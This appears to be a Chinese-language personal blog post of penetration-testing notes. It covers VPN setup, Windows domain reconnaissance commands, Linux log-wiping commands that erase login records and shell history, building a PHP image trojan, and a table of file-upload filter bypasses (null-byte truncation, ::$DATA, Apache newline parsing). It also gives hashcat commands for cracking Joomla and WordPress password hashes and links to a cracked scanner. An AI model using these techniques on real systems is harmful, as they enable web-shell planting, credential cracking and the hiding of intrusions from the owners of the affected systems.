---
layout: post
cover: 'assets/images/start.jpg'
title: Notes
date:   2018-02-01
tags: web
subclass: 'post'
navigation: True
logo: 'assets/images/ghost.png'
---

---

### 1. Kali使用pptp VPN

apt-get install network-manager-pptp network-manager-pptp-gnome

Settings->Network->VPN

在高级选项中去掉PAP,CHAP,EAP

勾选上点到点加密(MPPE)

### 2. Windows使用pptp VPN

创建成功后，VPN属性->安全->VPN类型，选择点对点隧道协议(PPTP)


### 3. domain

```
net user
net localgroup administrators
net group "domain computers" /domain
net group "Enterprise Admins" /domain
net group "Domain Admins" /domain
net view
```

### 4、获得当前的公网ip

https://api.ipify.org/

### 5、扫描Windows网络上NetBIOS名字信息

nbtscan 192.168.1.0/24

### 6、Linux擦除日志

```
echo "">/var/log/wtmp
echo ""> /var/log/btmp
echo ""> /var/log/lastlog
echo ""> /var/log/messages 
echo ""> /var/log/syslog 
echo ""> /var/log/sulog
history -c
```

### 7、域渗透

```
ipconfig /all                ------ 查询本机IP段，所在域等
net user                     ------ 本机用户列表
net localgroup administrators            ------ 本机管理员[通常含有域用户]
net user /domain                         ------ 查询域用户
net group /domain                        ------ 查询域里面的工作组
net group "domain admins" /domain        ------ 查询域管理员用户组
net localgroup administrators /domain    ------ 登录本机的域管理员
net localgroup administrators workgroup\user001 /add   ------域用户添加到本机
net group "domain controllers" /domain        ------ 查看域控制器(如果有多台)
net time /domain                   ------ 判断主域，主域服务器都做时间服务器
net config workstation             ------ 当前登录域
net session                        ------ 查看当前会话
net use \\ip\ipc$ pawword /user:username      ------ 建立IPC会话[空连接-***]
net share                          ------  查看SMB指向的路径[即共享]
net view                           ------ 查询同一域内机器列表
net view \\ip                      ------ 查询某IP共享
net view /domain                   ------ 查询域列表
net view /domain:domainname        ------ 查看workgroup域中计算机列表
net start                          ------ 查看当前运行的服务
net accounts                       ------  查看本地密码策略
net accounts /domain               ------  查看域密码策略
nbtstat –A ip                      ------netbios 查询
netstat –an/ano/anb                ------ 网络连接查询
route print                        ------ 路由表tasklist /V                        ----- 查看进程[显示对应用户]
tasklist /S ip /U domain\username /P /V             ----- 查看远程计算机进程列表
qprocess *                         ----- 类似tasklist
qprocess /SERVER:IP                ----- 远程查看计算机进程列表
nslookup –qt-MX Yahoo.com          ----- 查看邮件服务器
whoami /all                        ----- 查询当前用户权限等
set                                ----- 查看系统环境变量
systeminfo                         ----- 查看系统信息
qwinsta                            ----- 查看登录情况
qwinsta /SERVER:IP                 ----- 查看远程登录情况
fsutil fsinfo drives               ----- 查看所有盘符
gpupdate /force                    ----- 更新域策略cmdkey /l                          ----- 看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。）  echo %logonserver%                 ----- 查看登陆域
```


### 8、制作图片马

http://www.sohu.com/a/127074604_472906


准备一个图片文件`1.png`和一个一句话木马文件`hack.php`

```
copy 1.png/b+hack.php test.png
```

生成新文件`test.png`


### 9、文件上传

https://www.freebuf.com/articles/web/201421.html

```
操作	说明
前端禁用JS	前端限制，禁用JS，去除input标签的accept属性
修改文件后缀	抓包工具，修改文件后缀为黑名单之外的后缀
修改文件后缀	修改文件后缀为index.jpg.php
修改文件后缀	%00截断，比如index.php%00.jpg
修改文件后缀	文件名末尾添加::$DATA，windows会把::$DATA之后的数据当成文件流，不会检测后缀名.且保持::$DATA之前的文件名
修改文件后缀	在linux主机上的文件名大小写敏感，文件后缀大小混写
修改文件后缀	在文件末尾添加空格，黑名单的方式没法儿检测
修改文件类型	抓包工具，修改Content-Type:image/png
修改文件后缀	修改文件名shell.php:.jpg，上传后会得到一个空的文件shell.php，然后修改文件名为shell.>>>或者shell.<、shell.<<<、shell.>><再上传，重写shell.php
换行解析	Apache2.4.0~2.4.29换行解析漏洞%0d，%0a(CR,LF(回车，换行))
未知后缀名	Apache配置AddHandler application/x-httpd-php .php不当导致未知后缀脚本执行
后缀名正则替换	这种需要构造，使得替换之后的可以重组成为新的可执行后缀，双后缀名绕过
修改上传路径	name="upload_file/1.php%00"; filename="shell.jpg"
条件竞争	条件竞争删除/重命名文件时间差绕过
图片马	copy code.jpg/b + shell.php/b hourse.jpg
图片重绘包含马	做一个就好了
上传压缩包	配合PHP伪协议、文件协议等读取执行本地文件
数据库写文件	UDF，select查询输入
```

### 10、Default Password

https://cirt.net/passwords

### 11、AWVS

https://www.jb51.net/softs/659643.html

### 12.

![](https://raw.githubusercontent.com/4young/blog/master/photo/linux.png)

### 13.

https://www.yougetsignal.com/tools/web-sites-on-web-server/

### 14. Search file

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L9014

### 15.Hashcat

Joomla($2y$):

```
hashcat -m 3200 -o result.txt --remove hash.txt /usr/share/john/password.lst --force
```

Wordpress($P$):

```
hashcat -m 400 -o result.txt --remove hash.txt /usr/share/john/password.lst --force
```









